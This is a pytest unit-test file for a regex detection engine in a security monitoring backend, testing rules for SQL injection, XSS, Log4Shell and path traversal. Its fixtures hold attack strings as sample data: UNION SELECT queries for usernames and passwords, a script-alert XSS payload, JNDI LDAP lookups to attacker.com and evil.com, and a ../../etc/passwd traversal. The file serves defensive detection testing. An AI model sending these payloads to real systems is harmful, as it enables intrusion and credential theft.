"""Unit tests for Regex pattern matching engine."""

from datetime import UTC, datetime

import pytest

from backend.app.detection.interfaces import DetectionLayer, RuleType
from backend.app.detection.rules.regex_engine import (
    BUILTIN_PATTERNS,
    RegexEngine,
    RegexRule,
)
from backend.app.schemas.events import EventSeverity, SecurityEvent


class TestRegexRule:
    """Test suite for RegexRule class."""

    @pytest.fixture
    def sqli_rule(self) -> RegexRule:
        """Create SQL injection detection rule."""
        import re
        return RegexRule(
            rule_id="test_sqli_union",
            rule_name="Test SQL Injection UNION",
            pattern=re.compile(r"(?i)union\s+(all\s+)?select\s+"),
            severity=EventSeverity.HIGH,
            target_fields=["url", "raw_string"],
            mitre_techniques=["T1190"],
            tags=["sqli", "web-attack"],
        )

    @pytest.fixture
    def sqli_event(self) -> SecurityEvent:
        """Create event with SQL injection in URL."""
        return SecurityEvent(
            event_id="evt_sqli_001",
            timestamp=datetime.now(UTC),
            source="web_server",
            source_type="application",
            event_type="web_request",
            severity=EventSeverity.LOW,
            raw_data={"request": "GET /search?q=' UNION SELECT username,password FROM users--"},
            normalized_data={"action": "allowed"},
            url="/search?q=' UNION SELECT username,password FROM users--",
        )

    def test_regex_rule_properties(self, sqli_rule: RegexRule) -> None:
        """Verify RegexRule property accessors."""
        assert sqli_rule.rule_id == "test_sqli_union"
        assert sqli_rule.rule_type == RuleType.REGEX
        assert sqli_rule.severity == EventSeverity.HIGH
        assert "sqli" in sqli_rule.tags
        assert sqli_rule.enabled is True

    def test_regex_rule_matches(self, sqli_rule: RegexRule, sqli_event: SecurityEvent) -> None:
        """Verify rule matches SQL injection pattern."""
        match = sqli_rule.matches(sqli_event)

        assert match is not None
        assert match.rule_id == "test_sqli_union"
        assert match.rule_type == RuleType.REGEX
        assert match.severity == EventSeverity.HIGH
        assert match.matched_field == "url"
        assert "UNION SELECT" in match.matched_value

    def test_regex_rule_no_match(self, sqli_rule: RegexRule) -> None:
        """Verify rule does not match clean requests."""
        clean_event = SecurityEvent(
            event_id="evt_clean_001",
            timestamp=datetime.now(UTC),
            source="web_server",
            source_type="application",
            event_type="web_request",
            severity=EventSeverity.LOW,
            raw_data={},
            normalized_data={},
            url="/search?q=normal+query",
        )

        match = sqli_rule.matches(clean_event)
        assert match is None


class TestRegexEngine:
    """Test suite for RegexEngine class."""

    @pytest.fixture
    def engine(self) -> RegexEngine:
        """Create RegexEngine with built-in patterns."""
        return RegexEngine(load_builtin=True)

    @pytest.fixture
    def empty_engine(self) -> RegexEngine:
        """Create RegexEngine without built-in patterns."""
        return RegexEngine(load_builtin=False)

    def test_engine_properties(self, engine: RegexEngine) -> None:
        """Verify engine property accessors."""
        assert engine.engine_name == "regex_engine"
        assert engine.rule_type == RuleType.REGEX
        assert engine.detection_layer == DetectionLayer.L1_DETERMINISTIC
        assert engine.rule_count > 0  # Built-in patterns loaded

    def test_builtin_patterns_loaded(self, engine: RegexEngine) -> None:
        """Verify built-in patterns are loaded."""
        assert engine.rule_count >= len(BUILTIN_PATTERNS) - 5  # Allow some failures

    def test_add_custom_pattern(self, empty_engine: RegexEngine) -> None:
        """Verify adding custom pattern."""
        rule = empty_engine.add_pattern(
            pattern=r"(?i)custom_attack_pattern",
            name="Custom Attack Pattern",
            severity=EventSeverity.HIGH,
            target_fields=["raw_string"],
        )

        assert rule.rule_name == "Custom Attack Pattern"
        assert empty_engine.rule_count == 1

    def test_evaluate_sqli_detection(self, engine: RegexEngine) -> None:
        """Verify SQL injection detection."""
        event = SecurityEvent(
            event_id="evt_sqli_test",
            timestamp=datetime.now(UTC),
            source="nginx",
            source_type="application",
            event_type="web_access",
            severity=EventSeverity.LOW,
            raw_data={},
            normalized_data={},
            url="/api/users?id=1' UNION SELECT * FROM passwords--",
        )

        matches = engine.evaluate(event)
        assert len(matches) >= 1

        # Check at least one SQLi rule matched
        sqli_matches = [m for m in matches if "sqli" in m.tags]
        assert len(sqli_matches) >= 1

    def test_evaluate_xss_detection(self, engine: RegexEngine) -> None:
        """Verify XSS detection."""
        event = SecurityEvent(
            event_id="evt_xss_test",
            timestamp=datetime.now(UTC),
            source="web_app",
            source_type="application",
            event_type="web_request",
            severity=EventSeverity.LOW,
            raw_data={"body": "<script>alert('xss')</script>"},
            normalized_data={},
            url="/comment?text=<script>alert('xss')</script>",
        )

        matches = engine.evaluate(event)
        assert len(matches) >= 1

        xss_matches = [m for m in matches if "xss" in m.tags]
        assert len(xss_matches) >= 1

    def test_evaluate_log4shell_detection(self, engine: RegexEngine) -> None:
        """Verify Log4Shell JNDI injection detection."""
        event = SecurityEvent(
            event_id="evt_log4j_test",
            timestamp=datetime.now(UTC),
            source="java_app",
            source_type="application",
            event_type="web_request",
            severity=EventSeverity.LOW,
            raw_data={"user_agent": "${jndi:ldap://attacker.com/a}"},
            normalized_data={},
            url="/api/login?user=${jndi:ldap://evil.com/exploit}",
        )

        matches = engine.evaluate(event)
        assert len(matches) >= 1

        log4j_matches = [m for m in matches if "log4shell" in m.tags or "jndi" in m.tags]
        assert len(log4j_matches) >= 1

    def test_evaluate_path_traversal_detection(self, engine: RegexEngine) -> None:
        """Verify path traversal detection."""
        event = SecurityEvent(
            event_id="evt_lfi_test",
            timestamp=datetime.now(UTC),
            source="file_server",
            source_type="application",
            event_type="file_access",
            severity=EventSeverity.LOW,
            raw_data={},
            normalized_data={},
            url="/download?file=../../../../etc/passwd",
        )

        matches = engine.evaluate(event)
        assert len(matches) >= 1

        lfi_matches = [m for m in matches if "lfi" in m.tags or "path-traversal" in m.tags]
        assert len(lfi_matches) >= 1

    def test_evaluate_clean_event(self, engine: RegexEngine) -> None:
        """Verify clean events produce no matches."""
        event = SecurityEvent(
            event_id="evt_clean_test",
            timestamp=datetime.now(UTC),
            source="web_server",
            source_type="application",
            event_type="web_request",
            severity=EventSeverity.LOW,
            raw_data={"message": "Normal user activity"},
            normalized_data={},
            url="/api/products?category=electronics&sort=price",
        )

        matches = engine.evaluate(event)
        assert len(matches) == 0

    def test_get_patterns_by_tag(self, engine: RegexEngine) -> None:
        """Verify filtering patterns by tag."""
        sqli_rules = engine.get_patterns_by_tag("sqli")
        assert len(sqli_rules) > 0
        for rule in sqli_rules:
            assert "sqli" in rule.tags

    def test_clear_rules(self, engine: RegexEngine) -> None:
        """Verify clearing all rules."""
        assert engine.rule_count > 0
        engine.clear_rules()
        assert engine.rule_count == 0


class TestBuiltinPatterns:
    """Test suite for built-in pattern definitions."""

    def test_builtin_patterns_structure(self) -> None:
        """Verify built-in patterns have required fields."""
        for pattern in BUILTIN_PATTERNS:
            assert "id" in pattern
            assert "name" in pattern
            assert "pattern" in pattern
            assert "severity" in pattern
            assert "fields" in pattern
            assert isinstance(pattern["fields"], list)

    def test_builtin_patterns_valid_regex(self) -> None:
        """Verify all built-in patterns are valid regex."""
        import re
        for pattern in BUILTIN_PATTERNS:
            try:
                re.compile(pattern["pattern"])
            except re.error:
                pytest.fail(f"Invalid regex in pattern {pattern['id']}: {pattern['pattern']}")
